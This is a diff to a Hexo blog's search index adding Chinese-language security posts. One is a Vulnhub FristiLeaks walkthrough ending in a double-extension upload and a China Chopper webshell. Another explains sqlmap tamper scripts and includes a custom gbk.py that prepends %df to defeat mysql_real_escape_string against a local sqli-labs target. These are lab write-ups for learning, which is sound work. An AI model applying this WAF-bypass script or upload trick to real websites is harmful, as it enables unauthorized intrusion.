@@ -1,23 +1,26 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Vulnhub FristiLeaks]]></title>
+    <url>%2F2018%2F10%2F02%2FVulnhub-FristiLeaks%2F</url>
+    <content type="text"><![CDATA[A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc.. 0x01 开始前的准备环境下载https://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova.torrenthttps://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova 配置环境VMware users will need to manually edit the VM’s MAC address to: 08:00:27:A5:A6:76也就是把VMware的MAC地址调为08:00:27:A5:A6:76，之后开启虚拟机即可 0x02 扫描首先使用Nmap进行扫描 只有80端口开启，nmap扫描下80端口 可以看到robots文件存在，并有三个目录存在 访问192.168.1.5，除了一张图片，基本上没有什么了 robots.txt里的三个页面打开后是同一张图片，看来是毫无用处了，用御剑扫了下目录发现images文件夹,基本没用 0x03 获得Shell最后回到主页的图片上来，fristi，题目好像也有这个，于是试了下fristi 弱口令失败，看下源代码想找找有没有什么东西 Great 先将base64解码，出现PNG字样，用base64转图片 得到一串字符，尝试登陆： 正好第一处tip中有个名字，尝试登陆 进入上传页面 在namp扫描时发现服务器为Apache Linux所以尝试下多重后缀名 上传成功，用菜刀连接 0x04 提升权限正在骑马赶来的路上……]]></content>
+      <tags>
+        <tag>Web</tag>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[sqlmap --tamper脚本编写]]></title>
     <url>%2F2018%2F10%2F01%2Fsqlmap-tamper%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%2F</url>
     <content type="text"><![CDATA[工欲善其事,必先利其器 0x01 tamper脚本在没有WAF的情况下使用Sqlmap注入网站基本上是无往不利，但是WAF的存在使得注入变得艰难，而tamper脚本可以在大多数情况下完成自动化注入 0x02 tamper脚本分析本文仅选择lowercase.py进行分析 123456789101112131415161718192021222324252627282930313233343536373839404142434445#!/usr/bin/env python"""Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE' for copying permission"""import refrom lib.core.data import kb #导入sqlmap中lib\core\data中的kb函数，测试 SQL 注入的过程中，使用的配置文件事先全部被加载到了 conf 和 kbfrom lib.core.enums import PRIORITY#导入sqlmap中lib\core\enums中的PRIORITY函数， LOWEST = -100，LOWER = -50，. 详细见enums.py__priority__ = PRIORITY.NORMAL#定义优先级为一般def dependencies(): passdef tamper(payload, **kwargs):#定义tamper脚本，payload, **kwargs 为定义的参数，其中**kwargs为字典存储，类似于 &#123;'a': 1, 'c': 3, 'b': 2&#125; """ Replaces each keyword character with lower case value Tested against: * Microsoft SQL Server 2005 * MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0 Notes: * Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions &gt;&gt;&gt; tamper('INSERT') 'insert' """ retVal = payload if payload: for match in re.finditer(r"\b[A-Za-z_]+\b", retVal): word = match.group()#循环遍历每个单词 if word.upper() in kb.keywords:#如果是SQL中的关键词则替换为小写 retVal = retVal.replace(word, word.lower()) return retVal#返回替换后的payload 0x03 编写tamper脚本sqli-labs第36关 Bypass MYSQL_real_escape_string,绕过mysql_real_escape_string的方法本文不再累述,编写一个tamper脚本，使得payload中第一个单引号前加上%df 123456789101112131415161718192021222324252627282930313233343536373839#!/usr/bin/env python#coding:utf-8"""Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE' for copying permission"""from lib.core.data import kbfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.NORMALdef dependencies(): passdef tamper(payload, **kwargs): """ Tested against: * MySQL * gbk,mysql_real_escape_string &gt;&gt;&gt; tamper('1' and sleep(10) ') '1%df' and sleep(10)' """ retVal = "" if payload: first = False for i in payload: if i == '\'' and not first: retVal += '%df\'' first = True else: retVal += i return retVal 0x04 使用tamper脚本测试下脚本是否给力 1python2 .\sqlmap.py -u "http://localhost/sqli-labs/Less-36/?id=1" --tamper=gbk.py --dbs]]></content>
       <tags>
-        <tag>sqlmap</tag>
         <tag>Web</tag>
+        <tag>sqlmap</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[Hello World]]></title>
     <url>%2F2018%2F09%2F27%2Fhello-world%2F</url>
     <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
-      <categories>
-        <category>Test</category>
-      </categories>
-      <tags>
-        <tag>Test</tag>
-      </tags>
   </entry>
 </search>
